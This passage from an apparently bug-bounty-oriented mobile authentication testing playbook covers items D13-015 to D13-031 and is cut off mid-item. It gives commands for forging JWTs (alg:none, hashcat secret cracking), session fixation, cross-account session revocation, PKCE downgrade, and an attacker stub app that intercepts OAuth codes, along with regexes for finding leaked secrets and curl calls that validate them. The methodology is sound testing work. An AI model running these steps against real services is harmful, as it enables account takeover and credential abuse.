# read the login Activity in jadx and count the HttpPost/Request objects — two is the tell
grep -rn 'startsWith("auth_")\|token\.startsWith\|isAdmin()' jadx_out/sources/
```
The three shapes to recognise:
```java
if (username.equals("devadmin")) { responseBody = httpclient.execute(httppost2); }  // -> /devlogin
public boolean verifyToken(String t) { return t.startsWith("auth_"); }              // shape, not signature
if (user.isAdmin()) { /* show admin panel */ }                                      // client-decided role
```
- **Proof:** A 200 with a valid session for the special username and an empty or arbitrary password, obtained in Burp **independently of the client**. For the `startsWith` shape, mint `auth_anything` and send it to the API: a 200 delta versus a random string proves the server shares the weakness.
- **Escalation:** → D15 (full API surface as an administrator); → `broken_access_control.privilege_escalation`.
- **Ruled out when:** The alternate branch exists but the server returns 401 for it (dead code from a removed staging path — record it as an observation, not a finding), or the `startsWith`-style check is purely a client-side display gate and the API re-validates the token signature. A 401 on the forged token proves the check is client-only, which is Low at most — say so explicitly.

### D13-016 · App-level service credential in the binary (authenticates the app, not the user)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `.for_internal_asset` (P3); `.intentionally_public_sample_or_invalid` (P5) for keys the platform intends to be public |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | Oversecured banking-ATO item 3; Ostorlab "Finding and Validating Hardcoded Keys and Secrets"; MASWE-0004; Google ASI campaigns "Amazon Web Services Embedded Credentials", "Embedded Google Refresh Token OAuth", "Developer URL Leaked Credentials", "Exposed Firebase Cloud Messaging Server Keys" |

- **Test:** Distinct from a user session token: a credential that authenticates *the app*. Once it leaks, user-level authentication strength is irrelevant. The discipline is to classify each hit by what it authenticates and to **validate it live** rather than reporting the regex match.
- **How:**
```bash
grep -rEn 'AIza[0-9A-Za-z\-_]{35}|AKIA[0-9A-Z]{16}|xox[baprs]-[0-9A-Za-z-]{10,}|sk_live_[0-9a-zA-Z]{24,}|rzp_(live|test)_[0-9A-Za-z]{14}' jadx_out/sources/ jadx_out/resources/
unzip -p base.apk res/values/strings.xml | strings | grep -iE 'key|secret|token'   # R8 never renames resources
# validate, do not stop at the regex:
AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
curl -s "https://graph.facebook.com/v8.0/{appId}/permissions?access_token={token}"
curl -s "https://<project>.firebaseio.com/.json" | head -c 400
curl -i -H "Authorization: Bearer <token>" https://api.target/v1/me
```
- **Proof:** A successful authenticated response — an identity ARN, a permission list, real records — executed from a host that has never run the app. Not the regex match.
- **Escalation:** → D18 (cloud backend), D23 (payments), D24 (push). A leaked FCM server key also gives you delivery control for the D24 chains.
- **Ruled out when:** The key is one the platform intends to be public (Firebase web API key, Maps key) *and* the backing service's rules are closed — an invalid Firebase key returns `INVALID_KEY_TYPE` (401); a valid one on a locked database returns a permission error rather than data. Say which, explicitly, or triage bulk-closes the lot.

### D13-017 · Attestation-gated endpoints: is the verdict checked on the server?

| | |
|---|---|
| **Severity ceiling** | High (where the gate guards money movement or promo issuance); Medium otherwise |
| **VRT** | rated on what the gate protects; the client-side bypass alone is `lack_of_binary_hardening.runtime_instrumentation_based` (P5) |
| **Attacker** | AM-12 for the bypass, AM-01 for the consequence |
| **Applies to** | Apps using Play Integrity / SafetyNet Attestation / hardware key attestation |
| **Maps to** | Play Integrity API docs (token verification "must occur on your backend server, not on the client app"; check `requestDetails` `requestHash`/nonce, `appRecognitionVerdict == PLAY_RECOGNIZED`, `appLicensingVerdict == LICENSED`; do not cache verdicts); Key Attestation docs (verify the chain server-side, `attestationSecurityLevel ∈ {TrustedEnvironment, StrongBox}`, match `attestationChallenge` to your nonce, check `https://android.googleapis.com/attestation/status`) |

- **Test:** Many apps request the verdict, check it locally, and send an unauthenticated boolean to the server. The finding is the *server's* failure to verify, never the client-side bypass.
- **How:**
```bash
grep -rn 'IntegrityManager\|StandardIntegrityManager\|requestIntegrityToken\|integrityToken\|PlayIntegrity' jadx_out/sources
grep -rn 'setAttestationChallenge\|getCertificateChain\|KeyStore.getInstance("AndroidKeyStore")' jadx_out/sources
# does the sensitive request carry an opaque integrity token, and does removing it change anything?
curl -s -o /dev/null -w '%{http_code}\n' https://api.target/v1/transfer \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"amount":1,"to":"self"}'                                  # no integrity token at all
# and the client-boolean variant: does the body carry {"deviceSafe":true}?
```
- **Proof:** The sensitive endpoint returning 200 with the integrity token omitted, or with the client-side boolean flipped. That proves the gate is client-side.
- **Escalation:** → D21 (the RASP posture), D23 (what the gate guarded).
- **Ruled out when:** Removing or corrupting the integrity token produces a distinct server-side rejection, and the request carries an opaque token rather than a boolean. If the server *does* verify, stop burning time on Frida root-hiding and re-scope to server-side testing — a server-verified attestation cannot be forged by any local hook. Record that as a passing control with the evidence.

### D13-018 · Session not invalidated server-side on logout

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High as the amplifier on a token-theft primitive |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4); `.on_logout_server_side_only` (P5); `.all_sessions` (P5) |
| **Attacker** | AM-01 (with a stolen token), AM-11 (shared device) |
| **Applies to** | All |
| **Maps to** | MASWE-0024 (CWE-285/287/613); H1 #1172205 (Shopify Ping, Low 2.3), #67220, #7041, #165353 (Nextcloud, Medium), #194329; `hunt-session` disclosed Pattern 2 |

- **Test:** Many implementations only delete the client cookie or the local store. Replay the **captured value explicitly** — do not reuse the jar, because logout may have overwritten it.
- **How:**
```bash
T='<captured before logout>'
curl -s -o /dev/null -w 'before %{http_code}\n' https://api.target/v1/me -H "Authorization: Bearer $T"
# log out in the app, then:
curl -s -w '\nafter [%{http_code}]\n' https://api.target/v1/me -H "Authorization: Bearer $T"
# WebView half:
adb shell run-as com.target.app cat app_webview/Default/Cookies | strings | grep -i session
adb shell run-as com.target.app grep -ral "$T" /data/data/com.target.app/
```
Also read the logout call itself: Shopify #1172205 failed silently — `DELETE /api/v1/logout` returned `{"error":"Missing Logout Token Hint"}` and the server "will cancel the invalidation process".
- **Proof:** 200 after logout returning the account's unique identity marker, body-diffed against the authenticated baseline per D13-002 — not just a 200. Screenshot the app on its logged-out screen beside the terminal showing 200; that contrast is the whole report.
- **Escalation:** + any D11/D07/D08/D10 token-leak primitive → persistent access. File per D13-009: the leak is the primitive, this is the amplifier.
- **Ruled out when:** The replayed token returns 401 with an auth-named error and the WebView cookie DB no longer holds it. Note the VRT reality: `triage-validation` puts "session not invalidated on logout" on the never-submit list standalone, and Reddit excludes it explicitly. Without a theft chain this is a P4/P5 observation, not a report.

### D13-019 · Sibling sessions survive password change and email change

| | |
|---|---|
| **Severity ceiling** | High → Critical when the change endpoint also lacks step-up |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_password_change` (P4); `.on_email_change` (P5); escalate to `.authentication_bypass` (P1) with the chain |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | `hunt-session` Phase 3 + disclosed Pattern 3 ($4,000); ATT&CK T1640 Account Access Removal (the inverse test); H1 #194329 |

- **Test:** Apps frequently invalidate the *acting* session (B) but not *sibling* sessions (A). Sibling survival is the exact primitive that defeats "changing my password fixes the compromise". Mobile makes it worse: the app's session is often a long-lived refresh token that the account's web "active sessions" page never lists.
- **How:** Two jars for the same account. A = the "stolen" mobile session; B = the victim's browser.
```bash
for step in baseline after_pw_change after_email_change after_logout_all_devices; do
  printf '%-24s ' "$step"
  curl -s -L -H "Authorization: Bearer $A" https://api.target/v1/me -o /dev/null -w '[%{http_code}]\n'
  # perform the next state change from session B between iterations
done
```
- **Proof:** A still authenticates and returns the account's identity marker after B's change. The strongest variant: the app session is also absent from the account's own session list, so the victim could not have revoked it even if they tried.
- **Escalation:** → Critical when the change-password endpoint also lacks a current-password / MFA step-up (D13-071), because A pivots from read-only to full takeover; → `hunt-ato`.
- **Ruled out when:** A returns 401 after the password change *and* after the email change, with the session list showing zero residual sessions. Test the email change separately — it is a different code path and is frequently missed by the same implementation that handles passwords correctly.

### D13-020 · Refresh-token rotation and reuse detection

| | |
|---|---|
| **Severity ceiling** | High → Critical (persistent ATO that survives a password change) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the leaked refresh token keeps minting access tokens after remediation |
| **Attacker** | AM-01 |
| **Applies to** | All OAuth/OIDC and custom refresh-token backends; every mobile app is a public client |
| **Maps to** | draft-ietf-oauth-security-topics §2.2.2 ("Refresh tokens for public clients MUST be sender-constrained or use refresh token rotation"); RFC 9700; `hunt-session` Phase 7 |

- **Test:** Three distinct outcomes with three different severities: (a) no rotation at all — RT1 == RT0, a long-lived stealable credential; (b) rotation without replay detection — the leaked token still mints; (c) detection without family revocation — the replay is rejected but the current token survives, so the attacker's copy is never evicted.
- **How:**
```bash
RT0=$(curl -s -X POST https://api.target/api/login -H 'Content-Type: application/json' \
      -d '{"email":"...","password":"..."}' | jq -r '.refresh_token')
RT1=$(curl -s -X POST https://auth.target/oauth/token \
      -d grant_type=refresh_token -d refresh_token=$RT0 -d client_id=$CID | tee r1.json | jq -r '.refresh_token')
[ "$RT0" = "$RT1" ] && echo "NO ROTATION"
# replay the OLD one (simulates the leaked token)
curl -s -X POST https://auth.target/oauth/token \
  -d grant_type=refresh_token -d refresh_token=$RT0 -d client_id=$CID | tee r2.json
# correct BCP behaviour revokes the whole family — is RT1 dead now?
curl -s -o /dev/null -w 'RT1 after replay [%{http_code}]\n' -X POST https://auth.target/oauth/token \
  -d grant_type=refresh_token -d refresh_token=$RT1 -d client_id=$CID
```
- **Proof:** The JSON bodies for each of the three outcomes. Then the mobile-specific consequence: extract the refresh token from app storage (D11) and mint an access token from a different device, IP and User-Agent.
- **Escalation:** → D13-019 (does it survive the password change too?) → persistent ATO; → D13-022 (does "log out all devices" kill it?).
- **Ruled out when:** RT1 ≠ RT0, the RT0 replay is rejected, **and** RT1 is dead after that replay (family revocation). All three must hold. Detection without family revocation is still the finding.

### D13-021 · Revoked OAuth grant that comes back to life — the 20-hour re-test

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.permission_change` (VARIES); frame as `authentication_bypass` (P1) with the resurrected session |
| **Attacker** | AM-01 |
| **Applies to** | All apps whose account page lists "apps you have authorized" |
| **Maps to** | H1 #1632186 (Reddit, **Critical**, CWE Insufficient Session Expiration) |

- **Test:** Almost every tester checks revocation immediately, sees the app break, and stops. The bug lives on the other side of a cache-expiry window.
- **How:** (1) Log in on both app and web. (2) Web: account activity → "Apps you have authorized" → revoke the Android client. (3) Confirm the app errors. (4) **Wait ~20 hours.** (5) Re-open the app, or tap a push notification to wake it.
```bash
# instrument the wait rather than guessing: replay on a schedule
for h in 1 4 8 12 16 20 24; do
  printf 'T+%02dh ' "$h"
  curl -s -o /dev/null -w '[%{http_code}]\n' https://api.target/v1/me -H "Authorization: Bearer $AT"
  sleep 3600
done
```
- **Proof:** The app functioning normally on the revoked account, screen-recorded with the revocation page open in parallel showing the grant absent.
- **Escalation:** Argue it defeats the incident-response control — the user believes they have evicted an attacker and have not. The same long-delay methodology generalises: re-test 24h after a **password change** and 24h after **2FA enrolment**.
- **Ruled out when:** The token is refused at every interval out to at least 24 hours *and* a refresh attempt with the stored refresh token also fails. An immediate 401 at T+0 proves nothing on its own — that is the observation everyone else stops at.

### D13-022 · Active-devices screen: revoke-by-id IDOR and the invisible session class

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for the cross-account revoke; `broken_authentication_and_session_management.failure_to_invalidate_session.all_sessions` (P5) for the surviving token alone |
| **Attacker** | AM-05 |
| **Applies to** | All apps with a device / session management screen |
| **Maps to** | API1:2023 (the session record is an object with an owner); `hunt-idor` pattern library |

- **Test:** "Where you're logged in" is a component almost no mobile test exercises, and it carries two bugs. The revoke call may take a session id that is not scoped to the caller — targeted denial of service against any user. And the list may omit the attacker's own session class, so a long-lived refresh token or API token is invisible and therefore un-revokable by the victim.
- **How:**
```bash
curl -s https://api.target/v1/sessions -H "Authorization: Bearer $A" | jq '.[].id'
# revoke a session id belonging to account B using A's token
curl -s -X DELETE https://api.target/v1/sessions/$B_SESSION_ID -H "Authorization: Bearer $A" -i
# and: after "log out all other devices", does an old refresh token still mint?
curl -s -X POST https://api.target/v1/oauth/token \
  -d "grant_type=refresh_token&refresh_token=$OLD_RT" -i
```
- **Proof:** A 204/200 on the cross-account revoke with account B's app forced to the login screen; or a refresh token that still returns a new access token after "log out all devices", with the session list showing zero other devices.
- **Escalation:** The invisible-session variant is the impact statement for **every** stolen-token finding in this chapter: the victim cannot revoke what the app will not list. → D13-020.
- **Ruled out when:** The revoke endpoint returns 403/404 for a session id outside the caller's account (verify with D13-003 markers that the id was real), and "log out all devices" kills the stored refresh token as well as the access token. Test both halves — implementations routinely get one right and the other wrong.

### D13-023 · Deactivated or de-provisioned account still authenticates on mobile

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when a disabled principal reaches privileged data; otherwise `failure_to_invalidate_session.permission_change` (VARIES) |
| **Attacker** | AM-05 |
| **Applies to** | All B2B / multi-seat / staff-console apps |
| **Maps to** | H1 #175490 (Shopify, "Able to Login deactivated staff account in shopify app mobile"), #126260 (Uber, non-activated users on the partner app) |

- **Test:** Offboarding is implemented in the web admin and enforced by the web session layer. The mobile login path and the mobile token often skip the account-state check entirely.
- **How:**
```bash
# 1. capture a mobile token for the staff account, THEN deactivate it in the web admin
curl -s -o /dev/null -w 'pre-token after deactivation [%{http_code}]\n' \
  https://api.target/v1/me -H "Authorization: Bearer $STAFF_T"
# 2. fresh login on the app endpoint with the deactivated credentials
curl -s -X POST https://api.target/v1/login -H 'Content-Type: application/json' \
  -d '{"email":"offboarded@corp.example","password":"..."}' -i | head -20
# 3. and the role-downgrade variant: demote from admin to viewer, replay the pre-demotion token
```
- **Proof:** A working session for a user the admin console shows as disabled, plus a privileged read performed with it.
- **Escalation:** → D15 (what the deprovisioned principal can still reach) → the SSO single-logout variant: log out at the IdP only, then replay the app session.
- **Ruled out when:** Both the pre-deactivation token and a fresh mobile login are refused within the same request, and a role downgrade takes effect on the existing token rather than only on the next login. Check the downgrade case separately — a system that revokes on *deactivation* frequently ignores *demotion*.

### D13-024 · Session identifier quality: fixation across the auth boundary, and measured entropy

| | |
|---|---|
| **Severity ceiling** | High (fixation with an admin/SSO victim: Critical) |
| **VRT** | `broken_authentication_and_session_management.session_fixation.remote_attack_vector` (P3); `.local_attack_vector` (P5); `authentication_bypass` (P1) for a computed cross-user session |
| **Attacker** | AM-02 (fixation), AM-01 (entropy) |
| **Applies to** | Cookie-session and opaque-token backends. JWT-session backends: skip to D13-028 |
| **Maps to** | `hunt-session` Phase 1 + disclosed Pattern 1 ($7,500), Phase 5 + disclosed Pattern 4 ($5,000); NIST SP 800-63B (≥ 64 bits) |

- **Test:** Two properties of the same artefact. (1) The server must regenerate the session id at login — PHP `session_start()` without `session_regenerate_id(true)` is the canonical root cause. (2) Sequential or structurally-decodable ids let you compute another user's session.
- **How:**
```bash
# fixation: compare pre- and post-auth values, and try forcing an arbitrary one
curl -s -c - https://target.com/login -H "Cookie: PHPSESSID=attacker-controlled-12345" >/dev/null
# after the victim authenticates on that id:
curl -s https://target.com/admin -H "Cookie: PHPSESSID=attacker-controlled-12345"

# entropy: 200+ freshly-issued ids. -L is REQUIRED: a 302 often sets the cookie on the redirect target.
python3 - <<'PY'
import requests, collections
ids = []
for _ in range(200):
    s = requests.Session()
    s.post("https://api.target/v1/login", json=CREDS, allow_redirects=True, timeout=15)
    ids.append(s.cookies.get("SESSIONID"))
print("dupes:", [k for k,v in collections.Counter(ids).items() if v > 1])
PY
# then: sort -n for a steady delta; base64 -d / xxd looking for embedded userId, unix time, PID; ent/dieharder
```
- **Proof:** The pre-auth (or forced) value unchanged across the auth boundary *and* now returning authenticated data; or a demonstrated duplicate, a monotonic delta, or a decoded internal field. Not "the token looks short".
- **Escalation:** Fixation + an admin/SSO victim → admin session takeover; entropy → cross-user ATO → D15.
- **Ruled out when:** The post-auth cookie differs from the pre-auth one, an attacker-supplied value is rejected rather than adopted, and 200 samples show no duplicates, no monotonic delta and no decodable internal field. Precondition signal worth recording: the presence of the `__Host-` / `__Secure-` cookie prefix largely kills fixation. A long random-*looking* token is not proof of strength and a short high-entropy token may be fine — measure.

### D13-025 · Authenticated API calls before the biometric prompt; the session outlives the app lock

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the extracted token works off-device |
| **Attacker** | AM-11, AM-03 (any in-process primitive) |
| **Applies to** | All apps with an app-level lock (biometric / PIN) over an already-authenticated session |
| **Maps to** | MASWE-0024; m_kamal banking-app finding: "The application was sending authenticated API requests using the stored authorization token before showing the biometric prompt" |

- **Test:** The lock screen is cosmetic if the session is already live behind it. Watch the request timeline *before* touching the prompt, and test whether "locked" means anything to the backend at all.
- **How:**
```bash
# with the proxy inserted and pinning removed, kill and relaunch, then watch Burp BEFORE touching the prompt
adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
# then, with the app locked in its UI, replay a captured authenticated request with the same token
curl -s -o /dev/null -w 'locked-state replay [%{http_code}]\n' https://api.target/v1/me -H "Authorization: Bearer $T"
grep -rnE 'clearApplicationUserData|onTrimMemory|logout\(|invalidateToken|revoke' jadx_out/sources
```
- **Proof:** Burp showing authenticated requests returning 200 with the account's data while the biometric prompt is still on screen; plus a 200 on a request bearing the pre-lock token after the app is locked or killed.
- **Escalation:** → D13-010 (the token is portable) → D11 token theft → fully remote ATO.
- **Ruled out when:** No authenticated request is issued until after the prompt resolves, *and* the backend rejects the pre-lock token while the app is locked (i.e. the lock actually invalidates server-side). The second half is rare; record it as a passing control with the transcript when you find it.

### D13-026 · The account-state transition matrix

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.*` (P4/P5) per transition; `authentication_bypass` (P1) where a pre-transition token reaches another account |
| **Attacker** | AM-01, AM-11 (shared device) |
| **Applies to** | All |
| **Maps to** | `references/05` session and account-state bullets (Phase-25 escalation questions); MASWE-0024 |

- **Test:** Drive every state transition the app supports and replay the pre-transition token after each. The transitions that are tested least and break most: **account switching**, **app upgrade**, **reinstall**, and **token expiry**.
- **How:**
```bash
declare -A steps=(
 [fresh_login]="baseline"
 [background_foreground]="does re-auth happen?"
 [app_upgrade]="adb install -r newer.apk"
 [reinstall]="adb uninstall + adb install (does a session restore from backup?)"
 [account_switch]="switch to account B, then replay A's token"
 [token_expiry]="wait past exp, then replay"
)
for s in "${!steps[@]}"; do
  printf '%-22s ' "$s"
  curl -s -o /dev/null -w '[%{http_code}]\n' https://api.target/v1/me -H "Authorization: Bearer $T_A"
done
# reinstall variant: does the app land authenticated from a D2D/cloud backup?
adb shell run-as com.target.app ls -la shared_prefs/ databases/ files/
```
- **Proof:** A 200 with account A's data at a point in the lifecycle where the app's UI says A is no longer the active account, or where the app was reinstalled and never re-authenticated.
- **Escalation:** The reinstall/restore variant chains to D02/D11 (backup extraction) and to D13-091 (Restore Credentials); the account-switch variant chains to D15 BOLA with the wrong tenant's token.
- **Ruled out when:** Each transition either issues a new token and refuses the old one, or the old token's scope demonstrably no longer covers the switched-to account. Account switching is the highest-yield row: an app that keeps both tokens live in memory and picks by index is one off-by-one away from cross-account reads.

### D13-027 · JWT algorithm, key and claim battery against the server

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) for any successful forgery; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (VARIES) |
| **Attacker** | AM-01 |
| **Applies to** | Any JWT-based API — the default pattern for mobile backends |
| **Maps to** | PortSwigger JWT attacks (`none`, `hashcat -m 16500`, `jwk`/`jku`/`kid`, RS256→HS256 confusion); OWASP REST Security Cheat Sheet (never accept `{"alg":"none"}`; verify `iss`, `aud`, `exp`, `nbf`; `jti` denylist); CWE-347 |

- **Test:** Run the standard battery against the **server**, from curl, starting from a token you legitimately own.
- **How:**
```bash
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .    # read it first
# 1. none algorithm (note the trailing dot)
python3 - <<'PY'
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"1337","role":"admin"}).encode()).rstrip(b'=')
print((h + b'.' + p + b'.').decode())
PY
# 2. weak HMAC secret
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt && hashcat -a 0 -m 16500 jwt.txt --show
# 3. alg confusion RS256 -> HS256 using the server's public key as the HMAC secret
curl -s https://auth.target/.well-known/jwks.json | jq .
# 4. jwk / jku header injection; kid path traversal (../../dev/null) and kid SQLi
# 5. claims: tamper sub/scope/role, drop aud, drop exp, set exp far future
curl -i -H "Authorization: Bearer <forged>" https://api.target/v1/admin/users
```
Re-sign with the JWT Editor Burp extension (it automates the embedded-JWK attack) or `jwt_tool`.
- **Proof:** A 200 on an endpoint scoped to another user or role using a token you forged. Show the decoded payload of the forged token beside the response body containing the other account's marker.
- **Escalation:** A forged `sub` is universal BOLA — every object-level check downstream is now under your control (→ D15). A forged `role`/`scope` is vertical escalation.
- **Ruled out when:** Every variant returns 401 with a signature-verification error. **Run the pre-severity gate (D13-006) before calling this Critical**: the corpus's worked retraction is exactly this — `alg:none` confirmed a signature-bypass primitive at the audience-validation layer while the issuer-trust check still rejected unsigned tokens, the chain never completed, and the Critical had to be withdrawn. Confirm which layer accepted the token.

### D13-028 · JWT lifetime, `jti` and the absence of a revocation list

| | |
|---|---|
| **Severity ceiling** | High as the amplifier on a token-theft finding; Low standalone |
| **VRT** | `broken_authentication_and_session_management.excessive_jwt_lifetime` (P5); `insufficient_security_configurability.weak_jwt_hashing_algorithm` (P5); `sensitive_data_exposure.disclosure_of_secrets.sensitive_information_disclosed_jwt` (P5) |
| **Attacker** | AM-01 |
| **Applies to** | JWT-session mobile backends |
| **Maps to** | `hunt-session` Phase 6 + disclosed Pattern 6 ($2,500) |

- **Test:** Missing `exp` (or `exp` years out) means permanent access. Missing `jti` means the server cannot maintain a revocation list, so logout **cannot** truly revoke — which is why this item and D13-018 are the same report.
- **How:**
```bash
b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
b64url "$(cut -d. -f2 <<<"$JWT")" | jq '{exp, iat, nbf, sub, jti, aud, iss, scope}'
python3 -c "import sys,datetime;print(datetime.datetime.utcfromtimestamp(int(sys.argv[1])))" "$EXP"
# revocation test: log out, then replay the SAME JWT
curl -s https://api.target/v1/me -H "Authorization: Bearer $JWT"
# and check what PII the payload itself carries
```
- **Proof:** A decoded `exp` months out or absent, no `jti`, and the same JWT still returning the user after logout — body-diffed to rule out a cached 200.
- **Escalation:** All three nodes are P5 alone. They become payable only as the amplifier inside a token-theft report (D11/D14/D07/D08) — file them **inside** that report, not separately, per D13-009.
- **Ruled out when:** `exp` is short relative to the advertised session lifetime, `jti` is present, and a post-logout replay is refused (proving a denylist exists and is consulted). If `jti` is present but the post-logout replay succeeds, the denylist exists on paper only — that is the finding, and it is stronger than the lifetime observation.

### D13-029 · Social-login `id_token`: `aud`, `iss` and `email_verified` validation

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) |
| **Attacker** | AM-01 |
| **Applies to** | All apps offering native social sign-in alongside password accounts |
| **Maps to** | H1 #202177 (Instacart); Google backend-auth guidance ("verify the integrity of the ID token"); `hunt-oauth` "iss/aud claim not validated", "alg=none on OIDC ID token" |

- **Test:** Three independent checks the backend must perform and frequently does not. (1) Does `aud` match *its own* client id, or is a signature check the only validation? (2) Is `iss` the expected issuer, or will a token from a different relying party's flow be accepted? (3) Does the link-by-email path check the IdP's `email_verified` claim, or does any token asserting the victim's address take over the account? Distinguish OIDC from plain OAuth first: `scope=openid` or `response_type=code id_token` ⇒ OIDC; `response_type=code` with no `openid` ⇒ plain OAuth 2.0 and the ID-token attacks do not apply.
- **How:**
```bash
grep -rnE 'email_verified|getEmail\(\)|linkWithCredential|signInWithCredential|GoogleIdTokenCredential|GetGoogleIdOption|LoginManager|AccessToken|providerId' jadx_out/sources
# grab an id_token from an unrelated app that uses the same IdP, then:
curl -X POST https://api.target/api/v2/users/google_login_auth \
  -d 'id_token=<TOKEN_ISSUED_TO_A_DIFFERENT_CLIENT_ID>&login_only=true' -i
python3 -c "import base64,json,sys;print(json.loads(base64.urlsafe_b64decode(sys.argv[1].split('.')[1]+'==')))" "$TOKEN"
# and the email_verified variant, against a provider that lets the user set their own address
curl -s -X POST https://api.target/v1/auth/social -H 'Content-Type: application/json' \
  -d '{"provider":"custom","id_token":"<jwt with email=victim@x, no email_verified>"}' -i
```
- **Proof:** A session for the victim's existing account returned in exchange for a token whose `aud` is a different application's client id — show the decoded `aud` beside the target's own client id. That decoded claim is unarguable, which is why it survives triage even when the program's first rating is low.
- **Escalation:** → mass ATO for any user of that identity provider; this is the mobile realisation of the Non-verifying-IdP pre-hijacking class (D13-061).
- **Ruled out when:** A token with a foreign `aud` is rejected, a token from a foreign `iss` is rejected, and an unverified-email assertion creates a distinct account rather than linking to an existing one. Test all three — the `aud` check is the one most often present and the `email_verified` check the one most often missing.

### D13-030 · PKCE enforcement, not PKCE presence

| | |
|---|---|
| **Severity ceiling** | High → Critical chained with scheme squatting |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2); `broken_authentication_and_session_management.authentication_bypass` (P1) once you redeem an intercepted code |
| **Attacker** | AM-03 (a co-installed app with no dangerous permissions) |
| **Applies to** | Every mobile OAuth client |
| **Maps to** | RFC 8252 (public native clients MUST implement PKCE; AS MUST support it); draft-ietf-oauth-security-topics §2.1.1 (MUST use PKCE; MUST mitigate PKCE downgrade); `hunt-oauth` "PKCE downgrade attack" |

- **Test:** The presence of `code_challenge` in the app's request proves nothing about server enforcement. Four degradations.
- **How:**
```bash
# 1. inspect the /authorize URL: is code_challenge present, and is the method S256 (not plain)?
# 2. DOWNGRADE: strip code_challenge from /authorize entirely, complete the flow, then redeem with NO verifier
curl -s -X POST https://auth.target/oauth/token \
  -d grant_type=authorization_code -d code=$CODE -d client_id=$CID -d redirect_uri=$RURI
# 3. MISMATCH: keep code_challenge but send a WRONG code_verifier
# 4. PLAIN: send code_challenge_method=plain with challenge == verifier
```
- **Proof:** A token issued in case 2 or 3. That is a server that will exchange an intercepted authorization code with no proof of possession.
- **Escalation:** + D13-031 custom-scheme interception (→ D09 scheme squatting) = a complete account takeover chain by a malicious app on the same device. **Note the inversion that governs this whole family:** an OAuth `client_secret` in a mobile app is on the never-submit list as known and expected — PKCE non-enforcement is the reportable finding instead.
- **Ruled out when:** The token endpoint rejects the exchange with `invalid_grant` when `code_verifier` is omitted **and** when it is wrong, and refuses `code_challenge_method=plain`. Also check whether the redirect is a claimed **https** App Link rather than a custom scheme — that is RFC 8252's preferred mitigation and it changes the severity of the whole chain.

### D13-031 · Custom-scheme redirect interception by a competing app

| | |
|---|---|
| **Severity ceiling** | Critical (when it yields a token); High (when PKCE blocks redemption but code + state still leak) |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2); `broken_authentication_and_session_management.authentication_bypass` (P1) with the issued session |
| **Attacker** | AM-03 |
| **Applies to** | All apps using custom-scheme OAuth redirects |
| **Maps to** | RFC 8252 on private-use URI schemes: "multiple apps can typically register the same scheme, making it indeterminate as to which app will receive the authorization code"; Google Mobile VRP class "Leaking OAuth tokens" |

- **Test:** Private-use scheme redirects (`com.example.app:/oauth2redirect`) can be registered by **any** installed app; the OS makes no ownership guarantee. Build a stub that claims the same scheme and see whether it receives the code.
- **How:**
```bash
# 1. extract the scheme and the redirect_uri
aapt2 dump xmltree base.apk --file AndroidManifest.xml | grep -B4 -A4 'android:scheme'
# 2. build a stub APK with the same <data android:scheme="com.example.app"/> on an exported activity
#    whose onCreate logs getIntent().getData()
adb install attacker.apk && adb logcat -s ATTACKER:V
# 3. confirm the scheme resolves to more than one handler
adb shell pm query-activities -a android.intent.action.VIEW -d "com.example.app:/oauth2redirect"
adb shell dumpsys package r | grep -A15 'com.example.app:'
# 4. if the app instead claims an https redirect, verify the App Link is actually verified
adb shell pm get-app-links com.target.app          # require state 'verified'
```
- **Proof:** The attacker app's log line containing `code=...`, or the disambiguation chooser appearing (which itself proves two handlers are registered and the OS cannot decide). Then redeem the code — if PKCE is unenforced (D13-030), you get a token.
- **Escalation:** → D09 (deep links / App Link verification state) → D13-030 → ATO. Also test the loopback variant: an app that starts a local HTTP listener to catch the redirect exposes the code to every app on the device, because Android does not isolate loopback sockets between apps:
```bash
grep -rnE 'ServerSocket|NanoHTTPD|bind\(new InetSocketAddress' jadx_out/sources -B4 -A6
adb shell 'cat /proc/net/tcp /proc/net/tcp6' | awk '{print $2}' | grep -v local_address
```
Android 16's local-network permission gates LAN sockets behind `NEARBY_WIFI_DEVICES`, but **loopback is not covered** — the bug remains.
- **Ruled out when:** The redirect is an `https` App Link whose Digital Asset Links verification reports `verified` (not `none`, `legacy_failure`, or a numeric error ≥ 1024), the stub app receives nothing, and no loopback listener is present. A `verified` App Link plus enforced PKCE closes this class.

### D13-032 · `redirect_uri` matching laxity

| | |
|---|---|
| **Severity ceiling** | Critical |
